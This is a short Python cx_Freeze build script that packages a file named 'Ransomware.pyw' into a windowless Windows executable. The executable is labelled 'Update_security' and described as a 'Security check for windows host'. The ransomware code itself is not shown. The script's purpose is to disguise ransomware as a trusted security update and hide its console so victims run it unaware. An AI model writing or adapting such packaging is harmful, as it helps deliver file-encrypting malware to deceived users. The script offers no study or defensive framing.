#!/usr/bin/python
import sys
from cx_Freeze import setup, Executable

base = None
if (sys.platform == "win32"):
    base = "Win32GUI"
setup(
	name = "Update_security",
	version = "2.0",
	description = "Security check for windows host",
	executables = [Executable("Ransomware.pyw", base=base)]
)
